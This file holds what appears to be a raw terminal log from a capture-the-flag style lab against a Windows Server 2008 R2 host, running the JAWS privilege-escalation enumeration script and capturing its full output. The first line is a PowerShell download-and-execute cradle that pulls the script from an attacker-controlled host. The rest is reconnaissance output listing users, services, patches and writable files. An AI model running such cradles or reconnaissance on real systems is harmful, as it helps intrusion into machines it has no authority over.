@@ -1,0 +1,864 @@
+C:\temp>echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.21:8888/jaws-enum.ps1') | powershell -noprofile -
+
+Running J.A.W.S. Enumeration
+  - Gathering User Information
+  - Gathering Processes, Services and Scheduled Tasks
+  - Gathering Installed Software
+  - Gathering File System Information
+This program is blocked by group policy. For more information, contact your system administrator.
+  - Looking for Simple Priv Esc Methods
+############################################################
+##     J.A.W.S. (Just Another Windows Enum Script)        ##
+##                                                        ##
+##           https://github.com/411Hall/JAWS              ##
+##                                                        ##
+############################################################
+
+Windows Version: Microsoft Windows Server 2008 R2 Standard
+Architecture: AMD64
+Hostname: ACCESS
+Current User: security
+Current Time\Date: 11/20/2018 22:48:26
+
+-----------------------------------------------------------
+ Users
+-----------------------------------------------------------
+----------
+Username: Administrator
+Groups:   Administrators Users
+----------
+Username: engineer
+Groups:   Users
+----------
+Username: Guest
+Groups:   Guests
+----------
+Username: security
+Groups:   TelnetClients Users
+
+-----------------------------------------------------------
+ Network Information
+-----------------------------------------------------------
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . :
+   IPv6 Address. . . . . . . . . . . : dead:beef::d527:fb1d:c98:ecb0
+   Link-local IPv6 Address . . . . . : fe80::d527:fb1d:c98:ecb0%11
+   IPv4 Address. . . . . . . . . . . : 10.10.10.98
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.10.2
+
+Tunnel adapter isatap.{851F7B02-1B91-4636-BB2A-AAC45E5735BC}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . :
+
+-----------------------------------------------------------
+ Arp
+-----------------------------------------------------------
+
+Interface: 10.10.10.98 --- 0xb
+  Internet Address      Physical Address      Type
+  10.10.10.2            00-50-56-bf-b4-a9     dynamic
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+
+
+-----------------------------------------------------------
+ NetStat
+-----------------------------------------------------------
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1144
+  TCP    0.0.0.0:23             0.0.0.0:0              LISTENING       1240
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       704
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       368
+  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       792
+  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       856
+  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       484
+  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       492
+  TCP    10.10.10.98:23         10.10.14.21:48450      ESTABLISHED     1240
+  TCP    [::]:21                [::]:0                 LISTENING       1144
+  TCP    [::]:23                [::]:0                 LISTENING       1240
+  TCP    [::]:80                [::]:0                 LISTENING       4
+  TCP    [::]:135               [::]:0                 LISTENING       704
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:47001             [::]:0                 LISTENING       4
+  TCP    [::]:49152             [::]:0                 LISTENING       368
+  TCP    [::]:49153             [::]:0                 LISTENING       792
+  TCP    [::]:49154             [::]:0                 LISTENING       856
+  TCP    [::]:49155             [::]:0                 LISTENING       484
+  TCP    [::]:49156             [::]:0                 LISTENING       492
+  UDP    0.0.0.0:123            *:*                                    936
+  UDP    0.0.0.0:500            *:*                                    856
+  UDP    0.0.0.0:4500           *:*                                    856
+  UDP    0.0.0.0:5355           *:*                                    828
+  UDP    [::]:123               *:*                                    936
+  UDP    [::]:500               *:*                                    856
+  UDP    [::]:4500              *:*                                    856
+  UDP    [::]:5355              *:*                                    828
+
+
+-----------------------------------------------------------
+ Firewall Status
+-----------------------------------------------------------
+
+Firwall is Enabled
+
+-----------------------------------------------------------
+ FireWall Rules
+-----------------------------------------------------------
+
+Name                                                                   LocalPorts                                                            ApplicationName
+----                                                                   ----------                                                            ---------------
+Echo Reply
+Echo Request
+FTP (non-SSL)                                                          21
+Ports 21,23,80                                                         21,23,80
+Core Networking - Multicast Listener Done (ICMPv6-Out)
+Core Networking - Multicast Listener Query (ICMPv6-Out)
+Core Networking - Multicast Listener Report (ICMPv6-Out)
+Core Networking - Multicast Listener Report v2 (ICMPv6-Out)
+Core Networking - Neighbor Discovery Advertisement (ICMPv6-Out)
+Core Networking - Neighbor Discovery Solicitation (ICMPv6-Out)
+Core Networking - Packet Too Big (ICMPv6-Out)
+Core Networking - Parameter Problem (ICMPv6-Out)
+Core Networking - Router Advertisement (ICMPv6-Out)
+Core Networking - Router Solicitation (ICMPv6-Out)
+Core Networking - Time Exceeded (ICMPv6-Out)
+File and Printer Sharing (Echo Request - ICMPv4-Out)
+File and Printer Sharing (Echo Request - ICMPv6-Out)
+Core Networking - Group Policy (LSASS-Out)                             *                                                                     C:\Windows\system32\lsass.exe
+Core Networking - DNS (UDP-Out)                                        *                                                                     C:\Windows\system32\svchost.exe
+Core Networking - Dynamic Host Configuration Protocol (DHCP-Out)       68                                                                    C:\Windows\system32\svchost.exe
+Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCP... 546                                                                   C:\Windows\system32\svchost.exe
+Core Networking - Group Policy (TCP-Out)                               *                                                                     C:\Windows\system32\svchost.exe
+Core Networking - IPHTTPS (TCP-Out)                                    *                                                                     C:\Windows\system32\svchost.exe
+Core Networking - Teredo (UDP-Out)                                     *                                                                     C:\Windows\system32\svchost.exe
+File and Printer Sharing (LLMNR-UDP-Out)                               *                                                                     C:\Windows\system32\svchost.exe
+FTP Server (FTP Traffic-Out)                                           20                                                                    C:\Windows\system32\svchost.exe
+FTP Server Secure (FTP SSL Traffic-Out)                                989                                                                   C:\Windows\system32\svchost.exe
+Core Networking - Group Policy (NP-Out)                                *                                                                     System
+Core Networking - Internet Group Management Protocol (IGMP-Out)                                                                              System
+Core Networking - IPv6 (IPv6-Out)                                                                                                            System
+File and Printer Sharing (NB-Datagram-Out)                             *                                                                     System
+File and Printer Sharing (NB-Name-Out)                                 *                                                                     System
+File and Printer Sharing (NB-Session-Out)                              *                                                                     System
+File and Printer Sharing (SMB-Out)                                     *                                                                     System
+
+
+-----------------------------------------------------------
+ Hosts File Content
+-----------------------------------------------------------
+
+# Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to host names. Each
+# entry should be kept on an individual line. The IP address should
+# be placed in the first column followed by the corresponding host name.
+# The IP address and the host name should be separated by at least one
+# space.
+#
+# Additionally, comments (such as these) may be inserted on individual
+# lines or following the machine name denoted by a '#' symbol.
+#
+# For example:
+#
+#      102.54.94.97     rhino.acme.com          # source server
+#       38.25.63.10     x.acme.com              # x client host
+
+# localhost name resolution is handled within DNS itself.
+# 127.0.0.1       localhost
+# ::1             localhost
+
+
+-----------------------------------------------------------
+ Processes
+-----------------------------------------------------------
+
+Name                ProcessID Owner    CommandLine
+----                --------- -----    -----------
+cmd.exe                  2420 security /q /k C:\Windows\system32\login.cmd
+cmd.exe                  2424 security /q /k C:\Windows\system32\login.cmd
+conhost.exe              1036
+conhost.exe              2888 security \??\C:\Windows\system32\conhost.exe "264663789354008879-606719976483274934705951861452161900750014254856348774
+csrss.exe                 384
+csrss.exe                 324
+dllhost.exe              2028
+LogonUI.exe               784
+lsass.exe                 492
+lsm.exe                   500
+msdtc.exe                1844
+powershell.exe           2004 security powershell  -noprofile -
+services.exe              484
+smss.exe                  236
+spoolsv.exe              1080
+sppsvc.exe               2828
+svchost.exe              1144
+svchost.exe              1756
+svchost.exe              1192
+svchost.exe              1716
+svchost.exe              1408
+svchost.exe              1120
+svchost.exe               828
+svchost.exe               856
+svchost.exe               912
+svchost.exe               600
+svchost.exe               704
+svchost.exe               792
+svchost.exe               376
+svchost.exe               992
+svchost.exe               936
+System                      4
+System Idle Process         0
+tlntsess.exe             2920
+tlntsvr.exe              1240
+VGAuthService.exe        1296
+vmacthlp.exe              660
+vmtoolsd.exe             1384
+wininit.exe               368
+winlogon.exe              432
+WmiPrvSE.exe             1912
+
+
+
+-----------------------------------------------------------
+ Scheduled Tasks
+-----------------------------------------------------------
+Current System Time: 11/20/2018 22:48:27
+
+TaskName    : \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template Management (Automated)
+Run As User : Everyone
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template Management (Automated)
+Run As User : Everyone
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template Management (Manual)
+Run As User : Everyone
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Autochk\Proxy
+Run As User : LOCAL SERVICE
+Task To Run : %windir%\system32\rundll32.exe /d acproxy.dll,PerformAutochkOperations
+
+TaskName    : \Microsoft\Windows\CertificateServicesClient\UserTask
+Run As User : INTERACTIVE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\CertificateServicesClient\UserTask
+Run As User : INTERACTIVE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\CertificateServicesClient\UserTask
+Run As User : INTERACTIVE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\CertificateServicesClient\UserTask-Roam
+Run As User : INTERACTIVE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\CertificateServicesClient\UserTask-Roam
+Run As User : INTERACTIVE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Customer Experience Improvement Program\Consolidator
+Run As User : SYSTEM
+Task To Run : %SystemRoot%\System32\wsqmcons.exe
+
+TaskName    : \Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask
+Run As User : LOCAL SERVICE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Customer Experience Improvement Program\UsbCeip
+Run As User : LOCAL SERVICE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Customer Experience Improvement Program\Server\ServerCeipAssistant
+Run As User : SYSTEM
+Task To Run : %windir%\system32\ceipdata.exe
+
+TaskName    : \Microsoft\Windows\Customer Experience Improvement Program\Server\ServerRoleUsageCollector
+Run As User : SYSTEM
+Task To Run : %windir%\system32\ceipdata.exe -roleusage
+
+TaskName    : \Microsoft\Windows\Defrag\ScheduledDefrag
+Run As User : SYSTEM
+Task To Run : %windir%\system32\defrag.exe -c
+
+TaskName    : \Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector
+Run As User : SYSTEM
+Task To Run : %windir%\system32\rundll32.exe dfdts.dll,DfdGetDefaultPolicyAndSMART
+
+TaskName    : \Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticResolver
+Run As User : Users
+Task To Run : %windir%\system32\DFDWiz.exe
+
+TaskName    : \Microsoft\Windows\MemoryDiagnostic\CorruptionDetector
+Run As User : Users
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\MemoryDiagnostic\DecompressionFailureDetector
+Run As User : Users
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\MUI\LPRemove
+Run As User : SYSTEM
+Task To Run : %windir%\system32\lpremove.exe
+
+TaskName    : \Microsoft\Windows\Multimedia\SystemSoundsService
+Run As User : Users
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\NetTrace\GatherNetworkInfo
+Run As User : Users
+Task To Run : %windir%\system32\gatherNetworkInfo.vbs
+
+TaskName    : \Microsoft\Windows\Offline Files\Background Synchronization
+Run As User : Authenticated Users
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Offline Files\Logon Synchronization
+Run As User : Authenticated Users
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem
+Run As User : SYSTEM
+Task To Run : %SystemRoot%\System32\powercfg.exe -energy -auto
+
+TaskName    : \Microsoft\Windows\RAC\RacTask
+Run As User : LOCAL SERVICE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\RAC\RacTask
+Run As User : LOCAL SERVICE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Registry\RegIdleBackup
+Run As User : SYSTEM
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Server Manager\ServerManager
+Run As User : Administrators
+Task To Run : %windir%\system32\ServerManagerLauncher.exe
+
+TaskName    : \Microsoft\Windows\SideShow\AutoWake
+Run As User : LOCAL SERVICE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\SideShow\GadgetManager
+Run As User : Users
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\SideShow\SessionAgent
+Run As User : Users
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\SideShow\SystemDataProviders
+Run As User : LOCAL SERVICE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Task Manager\Interactive
+Run As User : INTERACTIVE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Tcpip\IpAddressConflict1
+Run As User : Users
+Task To Run : %windir%\system32\rundll32.exe ndfapi.dll,NdfRunDllDuplicateIPOffendingSystem
+
+TaskName    : \Microsoft\Windows\Tcpip\IpAddressConflict2
+Run As User : Users
+Task To Run : %windir%\system32\rundll32.exe ndfapi.dll,NdfRunDllDuplicateIPDefendingSystem
+
+TaskName    : \Microsoft\Windows\TextServicesFramework\MsCtfMonitor
+Run As User : Users
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Time Synchronization\SynchronizeTime
+Run As User : LOCAL SERVICE
+Task To Run : %windir%\system32\sc.exe start w32time task_started
+
+TaskName    : \Microsoft\Windows\WDI\ResolutionHost
+Run As User : INTERACTIVE
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\Windows Error Reporting\QueueReporting
+Run As User : Users
+Task To Run : %windir%\system32\wermgr.exe -queuereporting
+
+TaskName    : \Microsoft\Windows\Windows Filtering Platform\BfeOnServiceStartTypeChange
+Run As User : SYSTEM
+Task To Run : %windir%\system32\rundll32.exe bfe.dll,BfeOnServiceStartTypeChange
+
+TaskName    : \Microsoft\Windows\WindowsColorSystem\Calibration Loader
+Run As User : Users
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows\WindowsColorSystem\Calibration Loader
+Run As User : Users
+Task To Run : COM handler
+
+TaskName    : \Microsoft\Windows Defender\MP Scheduled Scan
+Run As User : SYSTEM
+Task To Run : c:\program files\windows defender\MpCmdRun.exe Scan -ScheduleJob -WinTask -RestrictPrivilegesScan
+
+
+
+
+-----------------------------------------------------------
+ Services
+-----------------------------------------------------------
+
+Name                                DisplayName                                             Status
+----                                -----------                                             ------
+SCPolicySvc                         Smart Card Removal Policy                              Stopped
+SessionEnv                          Remote Desktop Configuration                           Stopped
+SharedAccess                        Internet Connection Sharing (ICS)                      Stopped
+RSoPProv                            Resultant Set of Policy Provider                       Stopped
+sacsvr                              Special Administration Console Helper                  Stopped
+SCardSvr                            Smart Card                                             Stopped
+ShellHWDetection                    Shell Hardware Detection                               Stopped
+stisvc                              Windows Image Acquisition (WIA)                        Stopped
+swprv                               Microsoft Software Shadow Copy Provider                Stopped
+TabletInputService                  Tablet PC Input Service                                Stopped
+SNMPTRAP                            SNMP Trap                                              Stopped
+SSDPSRV                             SSDP Discovery                                         Stopped
+SstpSvc                             Secure Socket Tunneling Protocol Service               Stopped
+NetPipeActivator                    Net.Pipe Listener Adapter                              Stopped
+NetTcpActivator                     Net.Tcp Listener Adapter                               Stopped
+NetTcpPortSharing                   Net.Tcp Port Sharing Service                           Stopped
+Netlogon                            Netlogon                                               Stopped
+Netman                              Network Connections                                    Stopped
+NetMsmqActivator                    Net.Msmq Listener Adapter                              Stopped
+PerfHost                            Performance Counter DLL Host                           Stopped
+RasMan                              Remote Access Connection Manager                       Stopped
+RemoteAccess                        Routing and Remote Access                              Stopped
+RpcLocator                          Remote Procedure Call (RPC) Locator                    Stopped
+pla                                 Performance Logs & Alerts                              Stopped
+ProtectedStorage                    Protected Storage                                      Stopped
+RasAuto                             Remote Access Auto Connection Manager                  Stopped
+TapiSrv                             Telephony                                              Stopped
+WcsPlugInService                    Windows Color System                                   Stopped
+WdiServiceHost                      Diagnostic Service Host                                Stopped
+WebClient                           WebClient                                              Stopped
+VMwareCAFCommAmqpListener           VMware CAF AMQP Communication Service                  Stopped
+VMwareCAFManagementAgentHost        VMware CAF Management Agent Service                    Stopped
+VSS                                 Volume Shadow Copy                                     Stopped
+Wecsvc                              Windows Event Collector                                Stopped
+WPDBusEnum                          Portable Device Enumerator Service                     Stopped
+wuauserv                            Windows Update                                         Stopped
+wudfsvc                             Windows Driver Foundation - User-mode Driver Framework Stopped
+wercplsupport                       Problem Reports and Solutions Control Panel Support    Stopped
+WerSvc                              Windows Error Reporting Service                        Stopped
+wmiApSrv                            WMI Performance Adapter                                Stopped
+THREADORDER                         Thread Ordering Server                                 Stopped
+TPAutoConnSvc                       TP AutoConnect Service                                 Stopped
+TPVCGateway                         TP VC Gateway Service                                  Stopped
+TBS                                 TPM Base Services                                      Stopped
+TermService                         Remote Desktop Services                                Stopped
+Themes                              Themes                                                 Stopped
+TrustedInstaller                    Windows Modules Installer                              Stopped
+VaultSvc                            Credential Manager                                     Stopped
+vds                                 Virtual Disk                                           Stopped
+vmvss                               VMware Snapshot Provider                               Stopped
+UI0Detect                           Interactive Services Detection                         Stopped
+UmRdpService                        Remote Desktop Services UserMode Port Redirector       Stopped
+upnphost                            UPnP Device Host                                       Stopped
+dot3svc                             Wired AutoConfig                                       Stopped
+EapHost                             Extensible Authentication Protocol                     Stopped
+defragsvc                           Disk Defragmenter                                      Stopped
+clr_optimization_v4.0.30319_64      Microsoft .NET Framework NGEN v4.0.30319_X64           Stopped
+CscService                          Offline Files                                          Stopped
+AeLookupSvc                         Application Experience                                 Stopped
+hidserv                             Human Interface Device Access                          Stopped
+hkmsvc                              Health Key and Certificate Management                  Stopped
+FDResPub                            Function Discovery Resource Publication                Stopped
+FCRegSvc                            Microsoft Fibre Channel Platform Registration Service  Stopped
+fdPHost                             Function Discovery Provider Host                       Stopped
+clr_optimization_v4.0.30319_32      Microsoft .NET Framework NGEN v4.0.30319_X86           Stopped
+aspnet_state                        ASP.NET State Service                                  Stopped
+AudioEndpointBuilder                Windows Audio Endpoint Builder                         Stopped
+AppMgmt                             Application Management                                 Stopped
+ALG                                 Application Layer Gateway Service                      Stopped
+Appinfo                             Application Information                                Stopped
+AudioSrv                            Windows Audio                                          Stopped
+clr_optimization_v2.0.50727_32      Microsoft .NET Framework NGEN v2.0.50727_X86           Stopped
+clr_optimization_v2.0.50727_64      Microsoft .NET Framework NGEN v2.0.50727_X64           Stopped
+CertPropSvc                         Certificate Propagation                                Stopped
+BITS                                Background Intelligent Transfer Service                Stopped
+Browser                             Computer Browser                                       Stopped
+IPBusEnum                           PnP-X IP Bus Enumerator                                Stopped
+msiserver                           Windows Installer                                      Stopped
+lltdsvc                             Link-Layer Topology Discovery Mapper                   Stopped
+MSiSCSI                             Microsoft iSCSI Initiator Service                      Stopped
+KtmRm                               KtmRm for Distributed Transaction Coordinator          Stopped
+MMCSS                               Multimedia Class Scheduler                             Stopped
+napagent                            Network Access Protection Agent                        Stopped
+KeyIso                              CNG Key Isolation                                      Stopped
+nsi                                 Network Store Interface Service                        Running
+NlaSvc                              Network Location Awareness                             Running
+PlugPlay                            Plug and Play                                          Running
+W3SVC                               World Wide Web Publishing Service                      Running
+W32Time                             Windows Time                                           Running
+UxSms                               Desktop Window Manager Session Manager                 Running
+VMTools                             VMware Tools                                           Running
+VGAuthService                       VMware Alias Manager and Ticket Service                Running
+VMware Physical Disk Helper Service VMware Physical Disk Helper Service                    Running
+lmhosts                             TCP/IP NetBIOS Helper                                  Running
+PolicyAgent                         IPsec Policy Agent                                     Running
+Winmgmt                             Windows Management Instrumentation                     Running
+WinHttpAutoProxySvc                 WinHTTP Web Proxy Auto-Discovery Service               Running
+WinDefend                           Windows Defender                                       Running
+AppHostSvc                          Application Host Helper Service                        Running
+AppIDSvc                            Application Identity                                   Running
+WinRM                               Windows Remote Management (WS-Management)              Running
+MSDTC                               Distributed Transaction Coordinator                    Running
+BFE                                 Base Filtering Engine                                  Running
+eventlog                            Windows Event Log                                      Running
+WAS                                 Windows Process Activation Service                     Running
+netprofm                            Network List Service                                   Running
+WdiSystemHost                       Diagnostic System Host                                 Running
+MpsSvc                              Windows Firewall                                       Running
+FontCache                           Windows Font Cache Service                             Running
+ftpsvc                              Microsoft FTP Service                                  Running
+gpsvc                               Group Policy Client                                    Running
+RpcEptMapper                        RPC Endpoint Mapper                                    Running
+sppuinotify                         SPP Notification Service                               Running
+sppsvc                              Software Protection                                    Running
+Spooler                             Print Spooler                                          Running
+RpcSs                               Remote Procedure Call (RPC)                            Running
+SamSs                               Security Accounts Manager                              Running
+IKEEXT                              IKE and AuthIP IPsec Keying Modules                    Running
+Schedule                            Task Scheduler                                         Running
+SENS                                System Event Notification Service                      Running
+seclogon                            Secondary Logon                                        Running
+iphlpsvc                            IP Helper                                              Running
+RemoteRegistry                      Remote Registry                                        Running
+DcomLaunch                          DCOM Server Process Launcher                           Running
+ProfSvc                             User Profile Service                                   Running
+TlntSvr                             Telnet                                                 Running
+TrkWks                              Distributed Link Tracking Client                       Running
+COMSysApp                           COM+ System Application                                Running
+CryptSvc                            Cryptographic Services                                 Running
+Power                               Power                                                  Running
+LanmanServer                        Server                                                 Running
+EFS                                 Encrypting File System (EFS)                           Running
+EventSystem                         COM+ Event System                                      Running
+DPS                                 Diagnostic Policy Service                              Running
+Dhcp                                DHCP Client                                            Running
+Dnscache                            DNS Client                                             Running
+LanmanWorkstation                   Workstation                                            Running
+
+
+
+
+-----------------------------------------------------------
+ Installed Programs
+-----------------------------------------------------------
+
+Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161 9.0.30729.6161 Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161
+Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161 9.0.30729.6161 Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161
+Microsoft Visual C++ 2008 Redistributable - x86 9.0.21022      9.0.21022      Microsoft Visual C++ 2008 Redistributable - x86 9.0.21022
+VMware Tools                                                   10.2.5.8068393 VMware Tools
+Microsoft .NET Framework 4 Extended                            4.0.30319      Microsoft .NET Framework 4 Extended
+Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.17   9.0.30729      Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.17
+Microsoft .NET Framework 4 Client Profile                      4.0.30319      Microsoft .NET Framework 4 Client Profile
+Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.17   9.0.30729      Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.17
+
+
+
+-----------------------------------------------------------
+ Installed Patches
+-----------------------------------------------------------
+
+HotFixID  InstalledOn
+--------  -----------
+KB981391  8/21/2018 12:00:00 AM
+KB981392  8/21/2018 12:00:00 AM
+KB977236  8/21/2018 12:00:00 AM
+KB981111  8/21/2018 12:00:00 AM
+KB977238  8/21/2018 12:00:00 AM
+KB977239  8/21/2018 12:00:00 AM
+KB981390  8/21/2018 12:00:00 AM
+KB2032276 8/21/2018 12:00:00 AM
+KB2296011 8/21/2018 12:00:00 AM
+KB2305420 8/21/2018 12:00:00 AM
+KB2345886 8/21/2018 12:00:00 AM
+KB2347290 8/21/2018 12:00:00 AM
+KB2378111 8/23/2018 12:00:00 AM
+KB2386667 8/22/2018 12:00:00 AM
+KB2387149 8/21/2018 12:00:00 AM
+KB2393802 8/21/2018 12:00:00 AM
+KB2419640 8/21/2018 12:00:00 AM
+KB2423089 8/21/2018 12:00:00 AM
+KB2425227 8/21/2018 12:00:00 AM
+KB2442962 8/21/2018 12:00:00 AM
+KB2454826 8/21/2018 12:00:00 AM
+KB2467023 8/21/2018 12:00:00 AM
+KB2479943 8/23/2018 12:00:00 AM
+KB2483614 8/21/2018 12:00:00 AM
+KB2484033 8/21/2018 12:00:00 AM
+KB2488113 8/21/2018 12:00:00 AM
+KB2505438 8/21/2018 12:00:00 AM
+KB2506014 8/21/2018 12:00:00 AM
+KB2506212 8/21/2018 12:00:00 AM
+KB2506928 8/21/2018 12:00:00 AM
+KB2509553 8/21/2018 12:00:00 AM
+KB2511250 8/21/2018 12:00:00 AM
+KB2511455 8/21/2018 12:00:00 AM
+KB2522422 8/21/2018 12:00:00 AM
+KB2529073 8/22/2018 12:00:00 AM
+KB2535512 8/21/2018 12:00:00 AM
+KB2544893 8/21/2018 12:00:00 AM
+KB2545698 8/21/2018 12:00:00 AM
+KB2547666 8/21/2018 12:00:00 AM
+KB2552343 8/21/2018 12:00:00 AM
+KB2560656 8/21/2018 12:00:00 AM
+KB2563227 8/21/2018 12:00:00 AM
+KB2564958 8/21/2018 12:00:00 AM
+KB2570947 8/21/2018 12:00:00 AM
+KB2585542 8/21/2018 12:00:00 AM
+KB2598845 8/21/2018 12:00:00 AM
+KB2603229 8/21/2018 12:00:00 AM
+KB2604114 8/21/2018 12:00:00 AM
+KB2607047 8/21/2018 12:00:00 AM
+KB2608658 8/21/2018 12:00:00 AM
+KB2618451 8/21/2018 12:00:00 AM
+KB2620704 8/21/2018 12:00:00 AM
+KB2621440 8/21/2018 12:00:00 AM
+KB2631813 8/21/2018 12:00:00 AM
+KB2640148 8/21/2018 12:00:00 AM
+KB2643719 8/21/2018 12:00:00 AM
+KB2653956 8/21/2018 12:00:00 AM
+KB2654428 8/21/2018 12:00:00 AM
+KB2656355 8/21/2018 12:00:00 AM
+KB2660075 8/21/2018 12:00:00 AM
+KB2667402 8/21/2018 12:00:00 AM
+KB2676562 8/21/2018 12:00:00 AM
+KB2685811 8/21/2018 12:00:00 AM
+KB2685813 8/21/2018 12:00:00 AM
+KB2685939 8/21/2018 12:00:00 AM
+KB2690533 8/21/2018 12:00:00 AM
+KB2698365 8/21/2018 12:00:00 AM
+KB2705219 8/21/2018 12:00:00 AM
+KB2709630 8/21/2018 12:00:00 AM
+KB2712808 8/21/2018 12:00:00 AM
+KB2716513 8/23/2018 12:00:00 AM
+KB2718704 8/21/2018 12:00:00 AM
+KB2719033 8/21/2018 12:00:00 AM
+KB2726535 8/21/2018 12:00:00 AM
+KB2727528 8/23/2018 12:00:00 AM
+KB2729094 8/21/2018 12:00:00 AM
+KB2729451 8/21/2018 12:00:00 AM
+KB2741355 8/21/2018 12:00:00 AM
+KB2742598 8/21/2018 12:00:00 AM
+KB2748349 8/21/2018 12:00:00 AM
+KB2758857 8/21/2018 12:00:00 AM
+KB2761217 8/21/2018 12:00:00 AM
+KB2765809 8/21/2018 12:00:00 AM
+KB2770660 8/21/2018 12:00:00 AM
+KB2789644 8/21/2018 12:00:00 AM
+KB2791765 8/21/2018 12:00:00 AM
+KB2807986 8/21/2018 12:00:00 AM
+KB2813347 8/21/2018 12:00:00 AM
+KB2840149 8/21/2018 12:00:00 AM
+KB2998812 8/21/2018 12:00:00 AM
+KB958488  8/21/2018 12:00:00 AM
+KB972270  8/21/2018 12:00:00 AM
+KB974431  8/21/2018 12:00:00 AM
+KB974571  8/21/2018 12:00:00 AM
+KB975467  8/21/2018 12:00:00 AM
+KB975560  8/21/2018 12:00:00 AM
+KB977074  8/21/2018 12:00:00 AM
+KB978542  8/21/2018 12:00:00 AM
+KB978601  8/21/2018 12:00:00 AM
+KB979099  8/21/2018 12:00:00 AM
+KB979309  8/21/2018 12:00:00 AM
+KB979482  8/21/2018 12:00:00 AM
+KB979538  8/21/2018 12:00:00 AM
+KB979687  8/21/2018 12:00:00 AM
+KB979688  8/21/2018 12:00:00 AM
+KB980408  8/21/2018 12:00:00 AM
+KB980846  8/21/2018 12:00:00 AM
+KB982018  8/22/2018 12:00:00 AM
+KB982132  8/21/2018 12:00:00 AM
+KB982799  8/21/2018 12:00:00 AM
+
+
+
+-----------------------------------------------------------
+ Program Folders
+-----------------------------------------------------------
+
+C:\Program Files
+-------------
+Common Files
+Internet Explorer
+VMware
+Windows Defender
+Windows Mail
+Windows Media Player
+Windows NT
+Windows Photo Viewer
+Windows Portable Devices
+
+
+C:\Program Files (x86)
+-------------------
+Common Files
+FPSensor
+Internet Explorer
+Microsoft.NET
+Windows Defender
+Windows Mail
+Windows Media Player
+Windows NT
+Windows Photo Viewer
+Windows Portable Devices
+
+
+
+-----------------------------------------------------------
+ Files with Full Control and Modify Access
+-----------------------------------------------------------
+
+C:\temp\output.txt
+
+
+
+C:\Users\security\.yawcam\2\extravars\README.txt
+C:\Users\security\.yawcam\2\extravars\{temperature}.txt
+C:\Users\security\.yawcam\2\logs\info.txt
+C:\Users\security\.yawcam\2\stream\README.txt
+C:\Users\security\.yawcam\2\stream\template_js.html
+C:\Users\security\.yawcam\2\stream\template_mjpg.html
+C:\Users\security\.yawcam\2\stream\template_wm.html
+C:\Users\security\.yawcam\2\tmp\Readme.txt
+C:\Users\security\.yawcam\2\www\index.html
+C:\Users\security\.yawcam\2\www\update.html
+C:\Users\security\.yawcam\extravars\README.txt
+C:\Users\security\.yawcam\extravars\{temperature}.txt
+C:\Users\security\.yawcam\logs\info.txt
+C:\Users\security\.yawcam\stream\README.txt
+C:\Users\security\.yawcam\stream\template_js.html
+C:\Users\security\.yawcam\stream\template_mjpg.html
+C:\Users\security\.yawcam\stream\template_wm.html
+C:\Users\security\.yawcam\tmp\Readme.txt
+C:\Users\security\.yawcam\www\index.html
